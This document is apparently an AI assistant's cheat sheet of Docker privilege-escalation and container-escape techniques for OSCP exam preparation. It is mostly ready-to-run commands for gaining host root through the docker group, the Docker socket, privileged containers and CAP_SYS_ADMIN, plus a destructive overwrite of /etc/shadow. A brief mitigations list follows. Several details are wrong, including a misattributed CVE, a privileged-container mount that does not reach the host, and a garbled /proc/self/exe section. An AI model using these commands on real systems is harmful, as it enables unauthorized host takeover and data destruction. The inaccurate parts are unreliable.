# Docker Privilege Escalation Techniques

## Index
1. [If the user is in the `docker` group (CVE-2019-5736)](#user-in-docker-group)
2. [Escaping from a Privileged Container](#escaping-privileged-container)
    - [Method 1: Mount Host Filesystem](#mount-host-filesystem)
    - [Method 2: Overwrite `/etc/shadow`](#overwrite-etc-shadow)
3. [Exploiting Docker Socket (`/var/run/docker.sock`)](#exploiting-docker-socket)
4. [Using `capsh` in Containers (Capability Escalation)](#using-capsh)
5. [Abusing `/proc/self/exe` with Host Binaries](#abusing-proc-self-exe)
6. [Mitigations (For Defense)](#mitigations)

---

## 1️⃣ If the User is in the `docker` Group (CVE-2019-5736) <a name="user-in-docker-group"></a>
### **Impact:**  
Users in the `docker` group can run containers as `root` on the host.

### **Exploit:**
Run a privileged container and mount the host filesystem:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
This will give you **root access** on the host.

Alternatively, if you suspect the host has Bash:
```bash
docker run -it --rm -v /:/host ubuntu chroot /host /bin/bash
```
Now you are **root** on the host system.

---

## 2️⃣ Escaping from a Privileged Container <a name="escaping-privileged-container"></a>
If the container is running with **`--privileged`**, it has access to all host devices.

### **Method 1: Mount Host Filesystem** <a name="mount-host-filesystem"></a>
```bash
mount -o bind / /mnt
chroot /mnt sh
```
You now have **root** on the host.

### **Method 2: Overwrite `/etc/shadow`** <a name="overwrite-etc-shadow"></a>
If you can modify host files:
```bash
echo "root:\$6\$salt\$hash:18648:0:99999:7:::" > /etc/shadow
```
Then use the new password to log in.

---

## 3️⃣ Exploiting Docker Socket (`/var/run/docker.sock`) <a name="exploiting-docker-socket"></a>
If the **Docker socket** is writable, you can create a new container with full access.

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
```
Or start a **privileged container** directly:
```bash
docker run -it --privileged --net=host --pid=host -v /:/mnt alpine chroot /mnt sh
```
This grants **root access to the host**.

---

## 4️⃣ Using `capsh` in Containers (Capability Escalation) <a name="using-capsh"></a>
If capabilities like `CAP_SYS_ADMIN` are enabled, you can escalate privileges.

```bash
capsh --print
```
If you have `CAP_SYS_ADMIN`, you can mount the host filesystem:
```bash
mount -o bind / /mnt
chroot /mnt sh
```
Now you have **root access**.

---

## 5️⃣ Abusing `/proc/self/exe` with Host Binaries <a name="abusing-proc-self-exe"></a>
Some containers allow execution of host binaries. If `bash` is present:
```bash
/proc/self/exe
```
Or try executing `/bin/bash` from outside the container:
```bash
cat /proc/1/root/bin/bash
```

---

## 🔥 Mitigations (For Defense) <a name="mitigations"></a>
1. **Remove users from the `docker` group** unless necessary.
2. **Disable privileged mode** (`--privileged`).
3. **Restrict access to `/var/run/docker.sock`**.
4. **Use seccomp and AppArmor profiles**.
5. **Enforce least privilege with Kubernetes or Docker policies**.

---

Would you like a **lab setup** to practice these techniques before your OSCP exam? 🚀
